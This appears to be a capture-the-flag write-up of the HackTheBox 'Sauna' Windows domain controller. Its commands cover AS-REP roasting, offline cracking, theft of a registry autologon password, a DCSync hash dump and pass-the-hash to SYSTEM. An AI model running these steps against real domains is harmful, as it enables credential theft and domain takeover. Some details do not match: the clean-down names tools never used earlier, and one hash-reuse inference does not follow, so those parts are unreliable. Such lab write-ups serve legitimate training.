---
tags: [HTB, Sauna, Windows, ActiveDirectory, ASREPRoasting, DCSync, WinlogonAutologon, PassTheHash, Easy]
platform: HackTheBox
os: Windows Server 2019 Build 17763
hostname: SAUNA / SAUNA.EGOTISTICAL-BANK.LOCAL
domain: EGOTISTICAL-BANK.LOCAL
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Sauna, Full Walkthrough

## The gist

Sauna is a Windows domain controller running IIS. Anonymous RPC, LDAP, and SMB enumeration returned little, so the website became the username source. Names from the About page produced a valid AS-REP roasting target. After cracking the ticket, WinRM provided a foothold. The foothold had no useful group membership or token privilege, but Winlogon stored an autologon credential. That service account had direct replication rights, so DCSync dumped the domain hashes. Pass-the-hash then provided a SYSTEM shell.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 Build 17763 |
| Hostname | SAUNA |
| Domain | `EGOTISTICAL-BANK.LOCAL` |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName Sauna
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Sauna
boxset Domain egotistical-bank.local
boxset FQDN sauna.egotistical-bank.local
boxset Username fsmith
boxset Username2 svc_loanmgr
boxset Password $Password
boxset Password2 $Password2
boxset AdminUser Administrator
boxset AdminHash $AdminHash
boxset Lport $Lport
```

Do not store real passwords, hashes, or flag values in a shared write-up.

## 1. Full TCP scan

I started with all TCP ports because domain controllers expose several services that a default scan can miss.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/Sauna_allports
```

Open ports included 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, and several dynamic RPC ports. Port 80 was the first clear place to look for the username source.



SCREENSHOT: Capture the completed all-port scan with the open-port list visible.

## 2. Service and version scan

I scanned the discovered ports to identify the web server and domain services.

```bash
sudo nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 $BoxIP -oA $BoxDir/nmap/Sauna_services
```

Important findings were IIS 10.0 on port 80, LDAP and LDAPS, Kerberos, SMB, WinRM, and Windows Server 2019 Build 17763. SMB signing was required. Nmap also reported a large clock difference, which mattered for Kerberos later.



SCREENSHOT: Capture the service scan showing IIS, LDAP, Kerberos, SMB, and WinRM.

## 3. Local setup

I recorded the domain and FQDN for later commands and added them to the local hosts file.

```bash
boxset Domain egotistical-bank.local
boxset FQDN sauna.egotistical-bank.local
echo "$BoxIP $Domain $FQDN" | sudo tee -a /etc/hosts
```

## 4. Anonymous AD enumeration

I checked anonymous RPC, LDAP, and SMB before using credentials. This tells me whether the directory exposes users or shares without authentication.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP -b "DC=egotistical-bank,DC=local"
smbclient -N -L //$BoxIP
```

RPC returned access denied. Anonymous LDAP bind was accepted but returned no useful users. SMB null authentication succeeded but exposed no useful shares. This was not a dead end. The next source was HTTP.

> [!warning] 💡 Hint
> **Watch out:** Empty anonymous AD results do not mean the box has no username path. Check the website for About, Team, or contact pages that list real names.

> [!tip] ⚡ More efficient path
> **What we did:** Tested anonymous RPC, LDAP, and SMB one after another before checking the website.
>
> **Faster approach:**
> ```bash
> rpcclient -U '' -N $BoxIP -c 'enumdomusers' & ldapsearch -x -H ldap://$BoxIP -b "DC=egotistical-bank,DC=local" & smbclient -N -L //$BoxIP & wait
> curl -s http://$BoxIP/ | tee $BoxDir/loot/index.html
> ```
> **Why:** The directory checks and the HTTP check do not depend on each other, so running them together reduces waiting.

![[2.1anon-enum.png]]

SCREENSHOT: Capture the anonymous RPC, LDAP, and SMB results showing no useful directory data.

## 5. Website enumeration

I enumerated the IIS site and then read the About page because it was the most likely place for employee names.

```bash
feroxbuster -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t 30 -o $BoxDir/nmap/ferox.txt
curl -s http://$BoxIP/about.html
curl -s http://$BoxIP/about.html | tee $BoxDir/loot/about.html
```

The site listed Fergus Smith, Hugo Bear, Steven Kerb, Shaun Coins, Bowie Taylor, and Sophie Driver. I tested the common first-initial plus surname format and built a candidate list.

```bash
cat > $BoxDir/loot/users.txt << 'EOF'
administrator
fsmith
hbear
skerb
scoins
btaylor
sdriver
EOF
```

![[2.2about-page.png]]
![[2.3ferox.png]]
![[2.4about-page-source.png]]

SCREENSHOT: Capture the employee names and the discovered web paths.

## 6. Kerberos clock handling

Kerberos rejects tickets when the client clock is too far from the domain controller. The scan showed roughly seven hours of skew, so I synchronised the local clock with the target.

```bash
sudo timedatectl set-ntp false && sudo ntpdate $BoxIP
```

> [!warning] 💡 Hint
> **Watch out:** A large clock difference breaks Kerberos even when the username and password are correct. Sync the clock first, and remember that the VPN may drop after the time step.

> [!tip] ⚡ More efficient path
> **What we did:** Changed the local system clock with sudo before running the Kerberos attack.
>
> **Faster approach:**
> ```bash
> FakeTime=$(ntpdate -q "$BoxIP" | awk 'NR==1{print $1" "$2}')
> faketime "$FakeTime" GetNPUsers.py "$Domain/" -dc-ip "$BoxIP" -usersfile "$BoxDir/loot/users.txt" -no-pass -request -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
> ```
> **Why:** faketime runs only the Kerberos command with the target time, so it is useful when sudo is unavailable or changing the system clock would disrupt the VPN.

## 7. AS-REP roasting

AS-REP roasting requests a Kerberos response for accounts with pre-authentication disabled. The response can be cracked offline without logging in first.

```bash
faketime "$FakeTime" GetNPUsers.py "$Domain/" -dc-ip "$BoxIP" -usersfile "$BoxDir/loot/users.txt" -no-pass -request -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
```

The command printed little useful output, but `fsmith` produced a ticket in the output file. I checked the file rather than relying on the terminal output.

```bash
sed -n '1p' $BoxDir/loot/asrep.txt
```

> [!warning] 💡 Hint
> **Watch out:** GetNPUsers can succeed quietly. Always inspect the output file for a captured AS-REP response.

> [!tip] ⚡ More efficient path
> **What we did:** Built a username file from the website and supplied it to GetNPUsers.
>
> **Faster approach:**
> ```bash
> faketime "$FakeTime" GetNPUsers.py "$Domain/" -dc-ip "$BoxIP" -no-pass -request -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
> ```
> **Why:** If anonymous LDAP returns directory objects, GetNPUsers can obtain the domain user list itself and removes a manual list-building step.

![[3.1asrep-hash.png]]

SCREENSHOT: Capture the AS-REP output file or tool result without exposing the ticket value.

## 8. Offline password cracking

I cracked the AS-REP response locally. This does not send guesses to the domain.

```bash
hashcat -m 18200 $BoxDir/loot/asrep.txt /usr/share/wordlists/rockyou.txt
```

Hashcat recovered the password for `fsmith`. I stored the credential using the local helper without putting the password in this write-up.

```bash
boxset Username fsmith
boxset Password $Password
loot cred $Username $Password
```

![[3.2hashcat-cracked.png]]

SCREENSHOT: Capture the successful crack while redacting the password.

## 9. Credential validation and foothold

I validated the cracked credential against SMB, WinRM, and LDAP before opening an interactive shell.

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
netexec ldap $BoxIP -u $Username -p $Password -d $Domain
evil-winrm -i $BoxIP -u $Username -p $Password
```

WinRM provided a PowerShell shell as `egotisticalbank\fsmith` on SAUNA. The account was in Remote Management Users, Users, and Pre-Windows 2000 Compatible Access. Its listed privileges were not useful for escalation.

```powershell
whoami
hostname
whoami /groups
whoami /priv
Test-Path C:\Users\$env:USERNAME\Desktop\user.txt
```

The user flag path was confirmed, but its contents were intentionally not read.

![[4.1netexec-validation.png]]
![[5.1foothold-groups.png]]
![[6.1user-flag.png]]

SCREENSHOT: Capture credential validation, the foothold identity, and the flag path check. Do not capture flag contents.

## 10. Winlogon autologon credentials

The foothold did not provide a useful group or token-privilege path, so I checked common credential locations. Winlogon can store an autologon password so Windows can sign in automatically.

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
```

The registry exposed an autologon entry. The displayed username was `svc_loanmanager`, but that was not the account's SAMAccountName. The password was also exposed in cleartext. Both values had to be validated against the domain.

> [!warning] 💡 Hint
> **Watch out:** Winlogon `DefaultUserName` is a display value and may not be the exact SAMAccountName used for authentication. Test the candidate with NetExec instead of copying the display value blindly.

![[7.1winlogon-autologon.png]]

SCREENSHOT: Capture the Winlogon query with the password redacted.

## 11. Validate the service account

I first tested the registry username exactly as displayed. It failed. I then tested the shortened form of the registry display name, `svc_loanmgr`, which authenticated successfully.

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain
netexec winrm $BoxIP -u $Username2 -p $Password2 -d $Domain
netexec ldap $BoxIP -u $Username2 -p $Password2 -d $Domain
loot cred $Username2 $Password2
```

![[7.2svc-loanmgr-validation.png]]

SCREENSHOT: Capture successful validation for the service account with the password redacted.

## 12. Confirm replication rights

BloodHound can show the access-control path, but the important question was whether this account could replicate directory data. Collection confirmed the domain, users, groups, and computer objects, and the domain object showed direct `DS-Replication-Get-Changes-All` rights.

```bash
cd $BoxDir/loot
bloodhound-python -d $Domain -u $Username2 -p $Password2 -ns $BoxIP -c All --zip
cd $BoxDir
```

> [!warning] 💡 Hint
> **Watch out:** DCSync rights can be assigned directly to a service account. Do not assume every box needs an Account Operators to Exchange to ACL abuse chain.

> [!tip] ⚡ More efficient path
> **What we did:** Collected BloodHound data before testing the service account for a direct NTDS dump.
>
> **Faster approach:**
> ```bash
> netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
> ```
> **Why:** A service account with replication-related naming or permissions may work immediately. This confirms the path before spending time loading a BloodHound database.

![[8.1bloodhound-collection.png]]

SCREENSHOT: Capture the BloodHound collection result and the direct replication-rights finding.

## 13. DCSync

NetExec used the service account's replication rights to request NTDS data from the domain controller.

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds | tee $BoxDir/loot/ntds-output.txt
cp /home/kali/.nxc/logs/ntds/SAUNA_*/dcsync.ntds $BoxDir/loot/dcsync.ntds
```

The output included a warning that RemoteOperations failed with access denied, followed by a successful DRSUAPI dump. Seven domain hashes were recovered.

> [!warning] 💡 Hint
> **Watch out:** A RemoteOperations access-denied warning does not necessarily mean DCSync failed. DRSUAPI can still complete the directory replication request, so read the output after the warning.

Two accounts, HSmith and FSmith, had the same NTLM hash. That indicated password reuse and made the recovered Administrator hash usable for pass-the-hash.

> [!warning] 💡 Hint
> **Watch out:** Matching NTLM hashes mean two accounts use the same password. Treat hash reuse as a direct escalation clue and check the recovered privileged accounts.

![[9.1ntds-dump.png]]

SCREENSHOT: Capture the completed NTDS dump with hashes and passwords redacted.

## 14. Pass-the-hash and SYSTEM

I extracted the Administrator hash from the local NTDS output without printing its value. NetExec confirmed SMB access, then Impacket psexec created a temporary service and returned a SYSTEM shell.

```bash
AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4}' $BoxDir/loot/dcsync.ntds)
netexec smb $BoxIP -u $AdminUser -H $AdminHash -x whoami
psexec.py -hashes ":$AdminHash" "$AdminUser@$BoxIP"
```

Inside the shell, `whoami` returned `nt authority\system`. The host was SAUNA. The root flag path was confirmed but its contents were not read.

> [!warning] 💡 Hint
> **Watch out:** `dir /a` is a cmd.exe switch and can fail when entered in a PowerShell prompt. Use `Get-ChildItem -Force` in PowerShell, or explicitly start cmd.exe.

![[11.2-user-proof.png]]


SCREENSHOT: Capture the Administrator pass-the-hash validation and SYSTEM identity. Capture the root flag path only, never its contents.

## 15. Clean-down

No accounts were created and no target system files were permanently changed. The temporary psexec service and executable were removed when the shell exited.

```cmd
sc query $TempService
```

The verification returned service-not-found. The temporary WinPEAS file was stopped and removed from the target, and the local copy and temporary credential artifact were moved to trash. The local web server was stopped. The Winlogon registry and scheduled configuration were not modified.

## Credentials

| Account | Source | Use |
|---|---|---|
| `fsmith` | AS-REP roasting | WinRM foothold |
| `svc_loanmgr` | Winlogon autologon registry | Replication access |
| `Administrator` | DCSync NTDS output | Pass-the-hash |

Passwords and hashes are intentionally omitted.

## Key lessons

- Anonymous AD enumeration can be empty while the website exposes the usernames needed for AS-REP roasting.
- Kerberos needs an accurate clock. Query the target time before troubleshooting valid credentials.
- Winlogon is worth checking when a foothold has no useful groups or privileges.
- Validate registry usernames with the domain because display names can differ from SAMAccountNames.
- DCSync depends on replication rights, not necessarily a long group-abuse chain.
- A warning from one DCSync method does not prove that the DRSUAPI operation failed.
- Reused NTLM hashes can turn one recovered account into a privileged pass-the-hash login.

## External Resources

- [HackTricks: AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
- [HackTricks: DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [HackTricks: Credentials from Windows Registry](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-from-registry)
- [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Microsoft: Autologon](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)

## Checklist

- [x] Full TCP scan
- [x] Service and version scan
- [x] Anonymous RPC, LDAP, and SMB checks
- [x] Website username enumeration
- [x] AS-REP roasting and offline cracking
- [x] WinRM foothold
- [x] Winlogon autologon discovery
- [x] Direct replication-rights confirmation
- [x] DCSync
- [x] Pass-the-hash to SYSTEM
- [x] Clean-down and verification
